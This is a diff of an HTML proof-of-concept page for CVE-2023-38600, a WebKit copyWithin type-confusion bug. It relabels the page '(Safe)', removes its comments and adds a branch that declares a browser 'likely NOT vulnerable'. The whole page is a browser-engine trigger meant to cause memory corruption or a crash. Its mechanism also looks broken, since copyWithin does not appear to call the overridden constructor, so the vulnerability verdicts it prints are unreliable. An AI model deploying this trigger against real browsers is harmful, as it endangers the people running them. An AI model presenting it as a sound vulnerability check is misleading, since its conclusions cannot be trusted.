@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CVE-2023-38600 WebKit copyWithin PoC</title>
+  <title>CVE-2023-38600 WebKit copyWithin PoC (Safe)</title>
   <meta charset="UTF-8">
 </head>
 <body>
@@ -13,30 +13,27 @@ function log(msg) {
 }
 
 try {
-  // Create a JSArray with custom constructor to trigger type confusion
   let arr = [1.1, 2.2, 3.3, 4.4];
   let crafted = null;
 
-  // The crafted constructor returns a TypedArray which will be used in copyWithin's fast path
   arr.constructor = function() {
-    crafted = new Float64Array(8); // Chosen size is arbitrary for PoC
+    crafted = new Float64Array(8);
     log("[*] Custom constructor called, returning crafted Float64Array: " + crafted);
     return crafted;
   };
 
   log("[*] Before copyWithin, arr: " + arr);
 
-  // The core of the bug: triggers type confusion in WebKit JSC
   arr.copyWithin(1, 2, 3);
 
   log("[*] After copyWithin, arr: " + arr);
 
-  // Show crafted array contents
-  log("[*] Crafted array contents: " + Array.from(crafted));
-
-  // If vulnerable, this may cause memory corruption, crash, or strange values in 'crafted'
-  log("[*] If you see abnormal output or a crash, this browser is likely vulnerable to CVE-2023-38600.");
-
+  if (crafted) {
+    log("[*] Crafted array contents: " + Array.from(crafted));
+    log("[*] If you see abnormal output or a crash, this browser is likely vulnerable to CVE-2023-38600.");
+  } else {
+    log("[!] Custom constructor was NOT called. This browser is likely NOT vulnerable to CVE-2023-38600, or mitigation is present.");
+  }
 } catch (e) {
   log("[!] Exception: " + e);
 }
